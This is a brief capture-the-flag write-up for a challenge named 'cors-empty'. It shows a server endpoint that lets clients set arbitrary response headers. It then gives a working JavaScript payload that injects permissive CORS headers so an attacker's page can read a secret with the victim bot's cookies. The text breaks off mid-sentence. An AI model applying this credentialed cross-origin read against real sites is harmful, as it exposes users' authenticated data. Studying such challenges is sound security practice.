cors-empty
======================

The `POST /chal1/secret` endpoint on the victim app checks the bot's session and returns `{"flag": ...}` if authenticated. It then lets the user choose what headers to set in the response:

```python
for key, value in request.form.items():
    if 0 < len(key) <= 100 and len(value) <= 256:
        resp.headers[key] = value
```

Since the target app is cross-origin with the webpage hosting our content, we need to set the `Access-Control-Allow-Origin` header to let our origin read the response content. We also need to set `Access-Control-Allow-Credentials` to allow cross-origin resource sharing when passing credentials/cookies. 


```html
<script>
fetch('http://app.example.com/chal1/secret', {
  method: 'POST',
  credentials: 'include',
  body: new URLSearchParams({
    'Access-Control-Allow-Origin': 'http://usercontent.example.com',
    'Access-Control-Allow-Credentials': 'true',
  })
}).then(r => r.json()).then(d => console.log(d.flag))
</script>
```

When this page is visited, the bot's browser sends the request with its authenticated cookie, and the server responds with the flag and the two CORS headers. Since the CORS checks pass, the JSON body can then be read by JavaScript on http://usercontent.example.com,

